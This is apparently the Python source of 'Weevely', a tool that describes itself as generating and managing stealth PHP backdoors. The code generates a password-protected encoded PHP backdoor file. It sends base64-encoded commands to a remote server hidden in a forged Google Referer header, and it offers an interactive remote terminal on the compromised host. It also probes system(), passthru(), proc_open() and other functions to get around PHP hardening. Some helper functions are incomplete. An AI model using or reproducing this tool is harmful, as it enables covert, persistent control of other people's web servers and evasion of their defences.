#!/usr/bin/env python
# -*- coding: utf-8 -*-

from numpy import frombuffer, bitwise_xor, byte
import getopt, sys, base64, os, urllib2, re, urlparse, os

    
methods= [ "system()", "passthru()", "popen()", "exec()", "proc_open()", "shell_exec()", "pcntl_exec()", "perl->system()", "python_eval()" ]

def crypt(text):
  return base64.b64encode(text)
    
class weevely:
  
  modules = {}
  
  def main(self):
    
    self.banner()
    self.loadmodules()
  
    escape=0
    
    try:
	opts, args = getopt.getopt(sys.argv[1:], 'ltgsm:c:u:p:o:e:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output', 'escape'])
    except getopt.error, msg:
	print "Error:", msg
	exit(2)
    
    for o, a in opts:
	if o in ("-g", "-generate"):
	  moderun='g'
	if o in ("-t", "-terminal"):
	  moderun='t'
	if o in ("-l", "-list"):
	  moderun='l'
	if o in ("-c", "-command"):
	  cmnd=a
	  moderun='c'
	if o in ("-m", "-module"):
	  modul=a
	  moderun='m'
	if o in ("-e", "-escape"):
	  a = int(a)
	  if a>0 and a<9 and a%1==0:
	    escape=int(a)
	  else:
	    print "- Error: escape method is not a valid integer"
	    sys.exit(1)
	
	if o in ("-s", "-show"):
	  escape=-1
	  moderun='s'
	if o in ("-u", "-url"):
	  url=a
	  parsed=urlparse.urlparse(url)
	  if not parsed.scheme:
	    url="http://"+url
	  if not parsed.netloc:
	    print "- Error: URL not valid"
	    sys.exit(1)
	  
	if o in ("-p", "-password"):
	  if len(a)<4:
	    print "- Error: required almost 4 character long password"
	    sys.exit(1)
	  pwd=a
	if o in ("-o", "-output"):
	  outfile=a

    # Start
    if 'moderun' in locals():

  

      if moderun=='c' or moderun=='t' or moderun=='m' or moderun=='s':
	
	if 'pwd' not in locals():
	  pwd=''
	  while not pwd or len(pwd)<4:
	    print "+ Please insert almost 4 character long password : ",
	    pwd = sys.stdin.readline().strip()
	  
	
	if 'url' not in locals():
	  print "! Please specify URL (-u)"
	  sys.exit(1)
	  
	try:
	  self.host=host(url,pwd,escape)
	except Exception, e:
	  print "! Error: " + str(e) + ". Exiting."
	  raise
	  sys.exit(1)
	  

      if moderun=='g':
	if 'pwd' not in locals():
	  pwd=''
	  while not pwd or len(pwd)<4:
	    print "+ Please insert almost 4 character long password : ",
	    pwd = sys.stdin.readline().strip()
	
	if 'outfile' not in locals():
	  print "! Please specify where generate backdoor file (-o)"
	  sys.exit(1)
	


      if moderun=='c':       
	try:
	  print self.host.execute(cmnd)
	except Exception, e:
	  #print '! Command execution failed: ' + str(e) + '.'
	  raise
	return

      if moderun=='t':
	self.terminal(url,pwd)
      if moderun=='g':
	self.generate(pwd,outfile)
      if moderun=='m':
	self.execmodule(url,pwd,modul,os)
      if moderun=='l':
	self.listmodules()
    else:
      self.usage()
      sys.exit(1)

  def usage(self):
    print """+ Generate backdoor crypted code.
+  ./weevely -g -o <filepath> -p <pass>
+      
+ Execute remote commands.
+  ./weevely -c <command> -u <url> -p <pass>			Execute command.    
+  ./weevely -t -u <url> -p <password>		 		Start terminal.	         
+
+ Bypass PHP hardening protections 
+  ./weevely -s							Show available remote functions.
+  ./weevely -e <function number> -t -u <url> -p <password> 	Execute function.
+
+ Execute PHP modules on remote server 
+  ./weevely -l              				        List available modules.					
+  ./weevely -m <module>::<1arg>::..::<Narg> -u <url> -p <pass> Execute module."""
    
  def banner(self):
    print "+ Weevely - Generate and manage stealth PHP backdoors.\n+"

    
  def terminal(self, url, pwd):
    
    hostname=urlparse.urlparse(url)[1]
    
    while True:
      print hostname + '> ',
      cmnd = sys.stdin.readline()
      if cmnd!='\n':
	print self.host.execute(cmnd)

  def generate(self,key,path):
    f_tocrypt = file('php/encoded_backdoor.php')
    f_back = file('php/backdoor.php')
    f_output = file(path,'w')
    
    str_tocrypt = f_tocrypt.read()
    new_str_tocrypt = str_tocrypt.replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
    str_crypted = crypt(new_str_tocrypt)
    str_back = f_back.read()
    new_str = str_back.replace('%%%BACK_CRYPTED%%%', str_crypted)
    
    f_output.write(new_str)
    print '+ Backdoor file ' + path + ' created with password '+ key + '.'

  def execmodule(self, url, pwd, modulestring, os):
    
    modname = modulestring.split('::')[0]
    modargs = modulestring.split('::')[1:]
    
    if not self.modules.has_key(modname):
      print '! Module', modname, 'doesn\'t exist. Print list (-l).'
    else:
      m = self.modules[modname]
      if m.has_key('arguments'):
	argnum=len(self.modules[modname]['arguments'])
	if len(modargs)!=argnum:
	  print '! Module', modname, 'takes exactly', argnum, 'argument/s:', ','.join(self.modules[modname]['arguments'])
	  print '! Description:', self.modules[modname]['description']
	  return
       
      if m.has_key('os'):
	if self.host.os not in self.modules[modname]['os']:
	  print '- Warning: remote system \'' + self.host.os + '\' and module supported system/s \'' + ','.join(self.modules[modname]['os']).strip() + '\' seems not compatible.'
	  print '- Press enter to continue or control-c to exit'
	  sys.stdin.readline()
	
      f = file('modules/' + modname + '.php')
      modargsstring='"'+'","'.join(modargs) + '"'
      modutext = '$ar = Array(' + modargsstring + ');\n' + f.read()
      
      toinject=''
      for i in modutext.split('\n'):
	if len(i)>2 and ( i[:2] == '//' or i[0] == '#'):
	  continue
	toinject=toinject+i+'\n'
      
      try:
	ret = self.host.execute_php(toinject)
      except Exception, e:
	#print '! Module execution failed: ' + str(e) + '.'
	raise
      else:
	print ret
    
   
  def listmodules(self):
    
    for n in self.modules.keys():
      m = self.modules[n]
      
      print '+ Module:', m['name']
      if m.has_key('OS'):
	print '+ Supported OSs:', m['OS']
      
      if m.has_key('arguments'):
	print '+ Usage: ./weevely -m ' + m['name'] + "::<" + '>::<'.join(m['arguments']) + '>' + ' -u <url> -p <password>'
      else:
	print '+ Usage: ./weevely -m ' + m['name'] + ' -u <url> -p <password>'
	
      if m.has_key('description'):
	print '+ Description:', m['description'].strip()

      print '+'
  
  def loadmodules(self):
    files = os.listdir('modules')
    
    for f in files:
      module={}
      
      if f.endswith('.php'):
	
	  
	mod = file('modules/' + f)
	modstr = mod.read()
	modname = f[:-4]
	module['name']=modname
	
	restring='//.*Author:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['author']=founded[0]

	restring='//.*Description:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['description']=founded[0]
	  
	restring='//.*Arguments:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['arguments'] = [v.strip() for v in founded[0].split(',')]

	restring='//.*OS:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['os'] = [v.strip() for v in founded[0].split(',')]

	self.modules[module['name']]=module
     
    
class host():
  
  
  def __init__(self,url,pwd,escape):
    self.url=url
    self.pwd=pwd
    self.method=-1

    os = self.checkbackdoor(escape)
    
    self.os=os

  def checkbackdoor(self, escape):
    
    os = None
    
    # Eval test + OS check
    try:
      os = self.execute_php("echo PHP_OS;")
    except Exception, e:
      raise

    sum_ok = []
    sum_no = {}

    if escape == -1:
      
      print "+ Testing functions to bypass PHP hardening. Choose one of accepted with -e <number>."
      
      first=-1
      for i in range(0,9):
	try:
	  ret = self.execute("echo " + self.pwd, i)
	  if(ret==self.pwd):
	    sum_ok.append(methods[i])
	    first=i
	  else:
	    sum_no[methods[i]]=ret
	    #print '- Escape ' + str(i) + ' unexpected response ' + ret
	except Exception, e:
	  sum_no[methods[i]]='Remote PHP error: ' + ret
	  #print '- Escape ' + str(i) + ' invalid response: ' + ret +')'

      print "+ Accepted functions:",
      for m in sum_ok:
	  print  str(methods.index(m)) + " [" + m + "]", 
      print ''
	  
      if len(sum_no)>0:
	print "- Failed functions: ",
	for m in sum_no:
	  print  str(methods.index(m)) + " [" + m + "]", 
	print ''  
	  

      if first==-1:
	print '+ No working escape function founded.'
      else:
	self.method = first
    
    else:
      self.method = escape
      print '+ Weeveling ' + self.url + ' with ' + methods[escape] + '.' 
    
    return os

  def execute_php(self,cmnd):
    
    cmnd=cmnd.strip()
    cmdstr=crypt(cmnd)
    
    
    # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
    refurl='http://www.google.com/url?sa=' + self.pwd[:2] + '&source=' + cmdstr[:len(cmdstr)/2] + '&ei=' + cmdstr[(len(cmdstr)/2):]
    
    try: 
      ret=self.execHTTPGet(refurl)
    
    except urllib2.URLError, e:
      raise
    else: 
      restring='<' + self.pwd[2:] + '>(.*)</' + self.pwd[2:] + '>'
      e = re.compile(restring,re.DOTALL)
      founded=e.findall(ret)
      if len(founded)<1:
	raise Exception('Invalid response. Wrong password, url or backdoor not installed correctly.')
      else:
	return founded[0].strip()

  
  def execute(self, cmnd, met=-1):

    
    if(met==-1):
      met=self.method
      
    if(met==0):
      cmnd="@system('" + cmnd + " 2>&1');"
    elif(met==1):
      cmnd="passthru('" + cmnd + " 2>&1');"
    elif(met==2):
      cmnd="$h=popen('" + cmnd + "', 'r'); echo stream_get_contents($h); pclose($h);"
    elif(met==3):
      cmnd="echo @exec('" + cmnd + " 2>&1');"
    elif(met==4):
      cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); $r = stream_get_contents ($pipes[1]); echo $r . stream_get_contents($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);" 
    elif(met==5):
      cmnd="shell_exec('" + cmnd + " 2>&1');"
    elif(met==6):
      cmnd="$u = array('" + "','".join(cmnd.split(' ')[1:]) + "'); pcntl_exec('" + cmnd.split()[0] + "', $u);"
    elif(met==7):
      cmnd="$perl = new perl(); $r = @perl->system('" + cmnd + " 2>&1'); echo $r"
    elif(met==8):
      cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"

    
    return self.execute_php(cmnd)
    
    
  def execHTTPGet(self, refurl):
    req = urllib2.Request(self.url)
    req.add_header('Referer', refurl)
    r = urllib2.urlopen(req)
    return r.read()    
  
  def genUserAgent(self):
    winXP='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6'
    ubu='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14'
    msie='Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)'
    
  def genRefUrl(self,cmndstr):
    
    pwd=self.pwd
    
    mindistance='2083'
    minr=''
    
    for r in refurls:
      
      url=urlparse.urlparse(r)
      params=url[4]
      keys = [part.split('=')[0] for part in params.split('&')] #params.keys()
      values = [part.split('=')[1] for part in params.split('&')]

      
      distance =  []
      newparams = ''
    
      if len(keys) != 3:
	continue
      
      newparams = keys[0] + '=' + self.pwd + '&'
      distance.append(abs(len(values[0]) - len(self.pwd))) # pwd_distance
      
      newparams += keys[1] + '=' + cmndstr + '&'
      distance.append(abs(len(values[1]) - len(cmndstr)))
      
    
    
      newurl = url.geturl().replace(params,newparams)
      
      absdistance=0
      for i in distance:
	absdistance+=i
      
      if absdistance<mindistance:
	mindistance=absdistance
	minr=r
   
    #print '+ HTTP_REFERER fake header [' + str(refurls.index(minr)) + '] contains ' + str(absdistance) + ' characters more than real one.'
    
    
if __name__ == "__main__":
    
    
    app=weevely()
    try:
      app.main()
    except KeyboardInterrupt:
      print '\n! Received keyboard interrupt, exiting.'
      
      
    
    
   